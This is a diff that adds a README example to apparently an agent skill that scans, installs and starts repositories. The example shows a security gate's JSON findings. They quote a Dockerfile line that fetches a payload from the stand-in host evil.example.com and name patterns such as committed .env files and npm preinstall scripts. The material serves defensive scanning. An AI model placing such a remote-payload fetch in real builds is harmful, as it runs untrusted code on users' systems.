@@ -62,6 +62,44 @@ The skill then:
 5. **Installs** with lockfiles; falls back to mirrors on network failure; never global-installs
 6. **Starts** the service, **health-checks** it (TCP + common health paths, `scripts/health_check.py`), and reports ports/URLs + a reproduce command
 
+## Example: what the security gate catches
+
+Given a repo with a committed `.env`, a `preinstall` script, a Dockerfile that `ADD`s a remote payload, and a git-based dependency:
+
+```json
+{
+  "risk_level": "high",
+  "findings": [
+    {"severity": "high", "file": "Dockerfile", "line": 2,
+     "pattern": "docker-add-remote",
+     "evidence": "ADD https://evil.example.com/payload.sh /tmp/p.sh"},
+    {"severity": "high", "file": ".env",
+     "pattern": "committed-env",
+     "detail": "secrets file committed to the repo — should be gitignored"},
+    {"severity": "medium", "file": "package.json",
+     "pattern": "npm-lifecycle-script",
+     "evidence": "preinstall: echo pwned"},
+    {"severity": "medium", "file": "package.json",
+     "pattern": "git-or-local-dependency",
+     "evidence": "left-pad: github:foo/left-pad"}
+  ]
+}
+```
+
+Exit code `2` → the agent stops and asks before running anything. A clean repo exits `0` (`low`) and proceeds to install.
+
+Every run ends with a reproducible report:
+
+```
+Stack: node + npm (express, lockfile: package-lock.json)
+Security: low (0 findings)
+Install: npm ci (187 packages)
+Start: node index.js
+URL: http://127.0.0.1:3000 (health-checked: 200)
+SBOM: 187 components → sbom.json (CycloneDX 1.5)
+Repro: git clone --depth 1 <url> && cd <dir> && npm ci && node index.js
+```
+
 ## The 5 stages
 
 | Stage | What happens | Key artifact |
